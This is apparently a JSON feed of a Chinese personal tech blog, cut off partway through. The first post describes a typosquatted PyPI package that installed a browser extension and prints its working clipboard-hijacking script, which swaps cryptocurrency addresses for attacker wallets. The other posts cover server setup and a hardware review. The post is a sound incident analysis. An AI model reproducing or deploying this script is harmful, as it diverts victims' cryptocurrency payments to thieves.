{
    "version": "https://jsonfeed.org/version/1",
    "title": "Mean 个人博客",
    "description": "Mean 个人博客",
    "home_page_url": "https://blog.meancoder.xyz",
    "items": [
        {
            "id": "https://blog.meancoder.xyz/2023/crypto-wallet-address-replacement-attack/",
            "url": "https://blog.meancoder.xyz/2023/crypto-wallet-address-replacement-attack/",
            "title": "记一次加密钱包地址替换攻击",
            "date_published": "2023-06-06T03:29:43.000Z",
            "content_html": "<p>说来离谱，前几天发现电脑复制的文本全都没有格式，连换行都没有了。我一度以为是\nWindows 的问题，找了各种方法，甚至覆盖安装了一次。最后才发现是 pip\n装了个错误的包，给 Edge 装了插件，会不断替换剪贴板内容。</p>\n<span id=\"more\"></span>\n<h2 id=\"起因\">起因</h2>\n<p>起因是想处理个 XML\n文件，就想装个<code>beautifulsoup4</code>，结果输成了<code>beatifulsoup4</code>。运行还是缺库，才发现命令输错了，当时就卸载了，也没多想。</p>\n<h2 id=\"排查\">排查</h2>\n<p>之后就是发现剪贴板有问题，试过各种方法都不行。然后用<kbd>Win</kbd>+<kbd>V</kbd>打开剪贴板，发现剪贴板内容一秒闪一次，开始怀疑是有程序在监听并修改剪贴板。</p>\n<p>接下来就是用排除法，一个一个地关软件，把 Edge\n关闭后，剪贴板就不闪了。我万万没想到是 Edge\n这个浓眉大眼的家伙，之后就顺理成章地怀疑是插件作怪，结果就发现了这个名为“Windows”的可疑插件。</p>\n<figure>\n<img data-src=\"https://img1.meancoder.xyz/notes/others/crypto-wallet-address-replacement-attack.png\"\nalt=\"可疑插件\" />\n<figcaption aria-hidden=\"true\">可疑插件</figcaption>\n</figure>\n<p>然后打开插件位置，发现了一个 js 脚本：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">let</span> page = chrome.<span class=\"property\">extension</span>.<span class=\"title function_\">getBackgroundPage</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> inputElement = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;input&#x27;</span>);</span><br><span class=\"line\"><span class=\"variable language_\">document</span>.<span class=\"property\">body</span>.<span class=\"title function_\">appendChild</span>(inputElement);</span><br><span class=\"line\">inputElement.<span class=\"title function_\">focus</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">checkWalletAddresses</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">execCommand</span>(<span class=\"string\">&#x27;paste&#x27;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">var</span> clipboardContent = inputElement.<span class=\"property\">value</span>;</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^(0x)[A-Fa-f0-9]&#123;40&#125;$/g</span>, <span class=\"string\">&#x27;0x6eb2103839011Ed56c98145b3d3f9d6BE1b4dA63&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^T[A-Za-z1-9]&#123;33&#125;$/g</span>, <span class=\"string\">&#x27;TK3dtT7vYLkhUyzLqbQMmsrM36QzFnmfaa&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^(bnb1)[0-9a-z]&#123;38&#125;$/g</span>, <span class=\"string\">&#x27;bnb1pncs5ct0rdh3rcdms8708x9jrdy038ml33ceuw&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^([13]&#123;1&#125;[a-km-zA-HJ-NP-Z1-9]&#123;26,33&#125;|bc1[a-z0-9]&#123;39,59&#125;)$/g</span>, <span class=\"string\">&#x27;bc1qkjm7r677a4fkxcmx9kzlk55a9eaqtztq8zwrc2&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^[LM3][a-km-zA-HJ-NP-Z1-9]&#123;26,33&#125;$/g</span>, <span class=\"string\">&#x27;LcVct9KwHwUKftDNjbBxUtjK9WeUkYbRN3&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^r[0-9a-zA-Z]&#123;24,34&#125;$/g</span>, <span class=\"string\">&#x27;rJd2pxs7TxE77W8X3Ezt2QyrhMJixMehPx&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^D&#123;1&#125;[5-9A-HJ-NP-U]&#123;1&#125;[1-9A-HJ-NP-Za-km-z]&#123;32&#125;$/g</span>, <span class=\"string\">&#x27;DFbEVJUt9TcyBgVGriy3DcNBwYhK3s7Yhx&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^addr1[a-z0-9]+$/g</span>, <span class=\"string\">&#x27;addr1q8206rrze22rz8g5lggn4clv7zu9mq6w6a6llvw8v3l7r8k5l5xx9j55xyw3f7s38t37eu9ctkp5a4m4l7cuwerlux0qxlhwvz&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^[48]([0-9AB]&#123;1&#125;)([0-9a-zA-Z]&#123;93&#125;)$/g</span>, <span class=\"string\">&#x27;41iwYzbS1KKX8DFySxDcGBGGfJzywUeHxWumm4fjYxtYCiHtysXmq3P7RqG18Tv5UDKGNQegefxS2FFqrqeapvB7FuYSBJv&#x27;</span>);</span><br><span class=\"line\">    clipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^G[0-7A-Za-z]&#123;55&#125;$/g</span>, <span class=\"string\">&#x27;GCUPRZDN5RGSO3MC4LBIZBJMCS5KNUYQI2HZNUHVEBC5LNWZODWQ24XH&#x27;</span>);</span><br><span class=\"line\">\tclipboardContent = clipboardContent.<span class=\"title function_\">replace</span>(<span class=\"regexp\">/^cosmos[a-z0-9]&#123;39&#125;$/g</span>, <span class=\"string\">&#x27;cosmos1cd3hxdkc775zj75xtd3gqp8s7hynxkzewcf58y&#x27;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    inputElement.<span class=\"property\">value</span> = clipboardContent;</span><br><span class=\"line\">    inputElement.<span class=\"title function_\">select</span>();</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">execCommand</span>(<span class=\"string\">&#x27;copy&#x27;</span>);</span><br><span class=\"line\">    </span><br><span class=\"line\">    inputElement.<span class=\"property\">value</span> = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">setInterval</span>(checkWalletAddresses, <span class=\"number\">1000</span>);</span><br></pre></td></tr></table></figure>\n<p>这个脚本会每秒钟执行一次，把剪贴板的内容替换掉，导致了我的剪贴板格式丢失。</p>\n<h2 id=\"分析\">分析</h2>\n<p>在网上搜了一下部分代码，找到了一篇报道：<a\nhref=\"https://blog.phylum.io/phylum-discovers-revived-crypto-wallet-address-replacement-attack/\">Phylum\nDiscovers Revived Crypto Wallet Address Replacement Attack</a>。就是说\nPyPI\n中有很多和其他知名库名字相似的恶意库，会在浏览器中安装扩展，把剪贴板中的加密货币地址替换为攻击者的钱包地址。</p>\n<p>即使我第一时间就卸载了恶意库，但是在安装过程中就装了插件，卸载时并不会删除插件，所以恶意脚本就会留下来。好在我没有加密货币，不然搞不好真就要丢钱。</p>\n",
            "tags": [
                "服务器"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2023/oracle-cloud-free-server/",
            "url": "https://blog.meancoder.xyz/2023/oracle-cloud-free-server/",
            "title": "Oracle 云永久免费服务器",
            "date_published": "2023-02-08T12:15:35.000Z",
            "content_html": "<p>2021 年就了解到 <a\nhref=\"https://www.oracle.com/cn/cloud/free/\">Oracle\n云免费套餐</a>，当时还在准备考研，也申请了工行的学生信用卡，但是注册了好几次，没有通过，后来就放弃了。考完之后又不停地在试，都没有成功。一直到去年\n8 月份，突然注册成功了，就弄了一台凤凰城的 ARM 服务器，之后又弄了一台\nx86 的。简单记录一下使用时的一些问题。</p>\n<span id=\"more\"></span>\n<p>首先是网络，有免费的可更换的 IPv4 和 IPv6\n地址，还是挺舒服的。但是，Oracle 的服务器默认是不开启 IPv6\n的，需要手动开启。然后需要在安全规则里添加入站和出站规则。</p>\n<p>还有一个要注意的问题，需要在<code>iptables</code>里添加规则，否则会导致外网无法访问。具体命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo iptables -I INPUT -m state --state NEW -p tcp --dport 开放的端口号 -j ACCEPT</span><br></pre></td></tr></table></figure>\n<p>然后在服务器上装了 <a\nhref=\"https://github.com/jeessy2/ddns-go\">ddns-go</a>，不过 IP\n不经常变，没啥必要。还装了 <a\nhref=\"https://github.com/DIYgod/RSSHub\">RSSHub</a> 和<a\nhref=\"https://github.com/whyour/qinglong\">青龙</a>，这俩也都没用，主要的服务都部署在国内的腾讯云上。</p>\n<p>另外，用 DNSPod 解析 IPv4 可能导致 IP 被封，所以 IPv4\n就没解析了。</p>\n",
            "tags": [
                "服务器"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2022/WoA-experience/",
            "url": "https://blog.meancoder.xyz/2022/WoA-experience/",
            "title": "Windows on Arm 初体验",
            "date_published": "2022-08-23T04:25:06.000Z",
            "content_html": "<p>之前报名了荣耀神机营的 PC\n项目，本来是想着如果申请到了，旧笔记本就放在实验室，宿舍用新品。但是没想到新品是个二合一，还是\nWindows on Arm (WoA)的，这篇文章就是在这台机器上写的。</p>\n<figure>\n<img data-src=\"https://img1.meancoder.xyz/notes/others/matebook-e-go.jpg\"\nalt=\"MateBook E Go\" />\n<figcaption aria-hidden=\"true\">MateBook E Go</figcaption>\n</figure>\n<span id=\"more\"></span>\n<p>首先介绍一下，这块平板就是之前有人爆料的 MateBook E Go\n了，听名字就让人想到 Surface Go\n了。和我以前参加神机营的经历一样，这台机器也不是高端产品。之前爆料说这台机器搭载骁龙\n8cx Gen3，但是拿到手的是 Gen2，内存 16G，屏幕是 2K\n的，看着还不错。有两个 Type-C 接口，一个 3.5mm\n耳机口，双扬声器，指纹识别集成在电源键上。相机感觉和普通笔记本一个水平。配了一个\n65W 的充电器。</p>\n<p>体验几天下来，说一说感受吧。</p>\n<p>首先性能不太行，骁龙和 M1 相比差了一大截，不插电看 B\n站都卡，系统操作也不流畅。这个表现当日常主力使用肯定是不够的。但是 ARM\n续航不错，外出携带很方便，临时码个字，简单写个代码也还是可以的。</p>\n<p>外设方面，这次给配了一个皮套键盘和支架，可以通过触点连接，拿掉后也可以通过蓝牙连接，这个倒是挺方便的。但是这个键盘的\nFn\n键有点问题，热键模式下热键没法用，组合键和响应的还是单键的功能，不知道是设计如此还是\nbug。这一点对于经常使用功能键的我还是有很大影响的。支架的调节范围也挺大的，目测最大可以到\n140 度左右，挺不错的。</p>\n<p>生态方面，ARM 真的差太多了，甚至预装的华为电脑管家都还是 x64\n的。虽然现在可以转译 x86 和 x64\n应用，但是原生的还是会好一些，转译的多多少少会有一些问题。比如迅雷经常会闪退，Traffic\nMonitor 不会开机自启，微信今天也遇到了在窗口内鼠标消失的问题。</p>\n<p>作为半个程序员，常用的 IDE 和 SDK\n肯定是要装一下的。机器到手就马上装了 WSL、WSA、VS\nCode，单独开都还挺好，但是同时开就会很卡。JDK 装了微软的 ARM 版，Python\n3.10 的 RC 版也支持了 ARM，NodeJS 官方还没有 ARM\n版，第三方的又太旧了。IDEA 和 Android 都是 x64 的，比较卡。git 也是 x64\n的，在 VS Code 里用起来非常卡。最近 VS 预览版也支持 ARM\n了，装了一个，启动有点慢，用起来还行，顺手就编译了一个 ARM 版的 Traffic\nMonitor，但是任务栏窗口无法交互，还是等作者更新吧。</p>\n<p>最近 Fleet 也公测了，可惜也是没有 ARM\n版，而且基本上没啥用，还是等更新吧。</p>\n<hr />\n<p>最后附上目前装的 ARM 版软件：</p>\n<table>\n<thead>\n<tr class=\"header\">\n<th>软件</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody>\n<tr class=\"odd\">\n<td>Bandizip</td>\n<td></td>\n</tr>\n<tr class=\"even\">\n<td>Bitwarden</td>\n<td></td>\n</tr>\n<tr class=\"odd\">\n<td>Clash for Windows</td>\n<td></td>\n</tr>\n<tr class=\"even\">\n<td>Everything</td>\n<td>便携版</td>\n</tr>\n<tr class=\"odd\">\n<td>Edge</td>\n<td></td>\n</tr>\n<tr class=\"even\">\n<td>Firefox</td>\n<td></td>\n</tr>\n<tr class=\"odd\">\n<td>PowerToys</td>\n<td></td>\n</tr>\n<tr class=\"even\">\n<td>Typora</td>\n<td></td>\n</tr>\n<tr class=\"odd\">\n<td>Traffic Monitor</td>\n<td>自己编译</td>\n</tr>\n<tr class=\"even\">\n<td>VS Code</td>\n<td></td>\n</tr>\n<tr class=\"odd\">\n<td>WSL</td>\n<td></td>\n</tr>\n</tbody>\n</table>\n",
            "tags": [
                "杂"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2022/bitwarden-server/",
            "url": "https://blog.meancoder.xyz/2022/bitwarden-server/",
            "title": "自建 Bitwarden 服务器",
            "date_published": "2022-06-03T08:41:52.000Z",
            "content_html": "<p>好久没更新博客了，现在毕设答辩也结束了，终于有时间更新一下了。今天先写写\nBitwarden 服务器吧。</p>\n<span id=\"more\"></span>\n<p><a\nhref=\"https://bitwarden.com/\">Bitwarden</a>就不多介绍了，很有名的开源密码管理器。Bitwarden\n官方是有免费版的，也基本够用，但是既然有台服务器，又有些担心安全问题，就自己搭建了一个。</p>\n<p>Bitwarden 官方也提供部署脚本和 Dokcer\n镜像，但是占的资源比较多，所以选择了使用比较多的第三方的<a\nhref=\"https://github.com/dani-garcia/vaultwarden\">vaultwarden</a>（原名\nbitwarden_rs），非常轻量。</p>\n<p>我是用 Doceker Compose，没什么难度，简单分享下 compose 文件。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">version:</span> <span class=\"string\">&quot;3&quot;</span></span><br><span class=\"line\"><span class=\"attr\">services:</span></span><br><span class=\"line\">  <span class=\"attr\">vaultwarden:</span></span><br><span class=\"line\">    <span class=\"attr\">image:</span> <span class=\"string\">vaultwarden/server:latest</span></span><br><span class=\"line\">    <span class=\"attr\">container_name:</span> <span class=\"string\">vaultwarden</span></span><br><span class=\"line\">    <span class=\"attr\">restart:</span> <span class=\"string\">always</span></span><br><span class=\"line\">    <span class=\"attr\">environment:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">LOG_FILE=/data/bitwarden.log</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">WEBSOCKET_ENABLED=true</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">TZ=Asia/Shanghai</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">LC_ALL=zh_CN.UTF-8</span></span><br><span class=\"line\">    <span class=\"attr\">volumes:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">/var/bitwarden/data/:/data/</span></span><br><span class=\"line\">    <span class=\"attr\">ports:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">8880</span><span class=\"string\">:80</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"number\">3012</span><span class=\"string\">:3012</span></span><br></pre></td></tr></table></figure>\n<p>然后用 Nginx 做了个反代，加了 SSL。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">upstream vaultwarden-default &#123; server 127.0.0.1:8880; &#125;</span><br><span class=\"line\">upstream vaultwarden-ws &#123; server 127.0.0.1:3012; &#125;</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen       80;</span><br><span class=\"line\">    listen [::]:80;</span><br><span class=\"line\">    server_name  bitwarden.meancoder.xyz;</span><br><span class=\"line\"></span><br><span class=\"line\">    error_log  /var/log/nginx/error.log;</span><br><span class=\"line\"></span><br><span class=\"line\">    return       301 https://$host$request_uri;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">server &#123;</span><br><span class=\"line\">    listen 443 ssl http2;</span><br><span class=\"line\">    listen [::]:443 ssl http2;</span><br><span class=\"line\">    server_name  bitwarden.meancoder.xyz;</span><br><span class=\"line\"></span><br><span class=\"line\">    error_log  /var/log/nginx/error.log;</span><br><span class=\"line\"></span><br><span class=\"line\">    ssl_certificate /home/ubuntu/.keys/bitwarden.meancoder.xyz/Nginx/1_bitwarden.meancoder.xyz_bundle.crt;</span><br><span class=\"line\">    ssl_certificate_key /home/ubuntu/.keys/bitwarden.meancoder.xyz/Nginx/2_bitwarden.meancoder.xyz.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    location / &#123;</span><br><span class=\"line\">        proxy_pass http://vaultwarden-default;</span><br><span class=\"line\">        proxy_set_header Host $host;</span><br><span class=\"line\">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location /notifications/hub &#123;</span><br><span class=\"line\">        proxy_pass http://vaultwarden-ws;</span><br><span class=\"line\">        proxy_set_header Upgrade $http_upgrade;</span><br><span class=\"line\">        proxy_set_header Connection &quot;upgrade&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location /notifications/hub/negotiate &#123;</span><br><span class=\"line\">        proxy_pass http://vaultwarden-default;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    location /admin &#123;</span><br><span class=\"line\">        auth_basic &quot;Administrator’s Area&quot;;</span><br><span class=\"line\">        auth_basic_user_file /etc/apache2/.htpasswd;</span><br><span class=\"line\">        proxy_set_header Host $host;</span><br><span class=\"line\">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class=\"line\">        proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class=\"line\">        proxy_pass http://vaultwarden-default;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>中间还遇到了一个小问题，刚搭建完的时候，想随便建个账号测试下，可是注册的时候一直报错，改了半天配置都不行。最后换了个复杂的密码就好了。</p>\n",
            "tags": [
                "服务器"
            ]
        },
        {
            "id": "https://blog.meancoder.xyz/2022/buaa-ai-schedule-develop/",
            "url": "https://blog.meancoder.xyz/2022/buaa-ai-schedule-develop/",
            "title": "小爱课程表课程导入开发实践",
            "date_published": "2022-02-07T09:24:57.000Z",
            "content_html": "<p><a href=\"https://github.com/MeanZhang/buaa-ai-schedule\"><img data-src=\"https://api.meancoder.xyz/schedule\" alt=\"使用人数\" /></a></p>\n<p>MIUI\n的小爱同学内置小爱课程表，可以从学校的教务系统自动导入课程信息，非常实用。可惜我们学校没有适配，索性我就自己写了一下，顺便练练手。</p>\n<p>代码已经上传到 <a\nhref=\"https://github.com/MeanZhang/buaa-ai-schedule\">Github</a>\n了，只有三个文件，<a\nhref=\"https://open-schedule-prod.ai.xiaomi.com/docs/#/help/\">开发者文档</a>有详细说明，这里就贴一下代码。</p>\n<span id=\"more\"></span>\n<div class=\"tabs\" id=\"小爱课程表\"><ul class=\"nav-tabs\"><li class=\"tab active\"><a href=\"#小爱课程表-1\">scheduleHtmlProvider.js</a></li><li class=\"tab\"><a href=\"#小爱课程表-2\">scheduleHtmlParser.js</a></li><li class=\"tab\"><a href=\"#小爱课程表-3\">scheduleTimer.js</a></li></ul><div class=\"tab-content\"><div class=\"tab-pane active\" id=\"小爱课程表-1\"><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">async</span> <span class=\"keyword\">function</span> <span class=\"title function_\">scheduleHtmlProvider</span>(<span class=\"params\"></span></span><br><span class=\"line\"><span class=\"params\">  iframeContent = <span class=\"string\">&quot;&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">  frameContent = <span class=\"string\">&quot;&quot;</span>,</span></span><br><span class=\"line\"><span class=\"params\">  dom = <span class=\"variable language_\">document</span></span></span><br><span class=\"line\"><span class=\"params\"></span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">await</span> <span class=\"title function_\">loadTool</span>(<span class=\"string\">&quot;AIScheduleTools&quot;</span>);</span><br><span class=\"line\">  <span class=\"comment\">// 使用它们的时候务必带上await，否则没有系统alert的时停效果</span></span><br><span class=\"line\">  <span class=\"keyword\">await</span> <span class=\"title class_\">AIScheduleAlert</span>(</span><br><span class=\"line\">    <span class=\"string\">&quot;开始导入……\\n完成后请手动修改开学时间\\n如导入出错或有其他建议请联系QQ：390602272&quot;</span></span><br><span class=\"line\">  );</span><br><span class=\"line\">  <span class=\"keyword\">let</span> iframe = dom.<span class=\"title function_\">getElementsByTagName</span>(<span class=\"string\">&quot;iframe&quot;</span>)[<span class=\"number\">0</span>].<span class=\"property\">contentDocument</span>;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> table = iframe.<span class=\"title function_\">getElementsByClassName</span>(<span class=\"string\">&quot;xfyq_area mt10&quot;</span>)[<span class=\"number\">0</span>].<span class=\"property\">outerHTML</span>;</span><br><span class=\"line\">  <span class=\"comment\">// console.info(table)</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span> table;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></div><div class=\"tab-pane\" id=\"小爱课程表-2\"><figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span 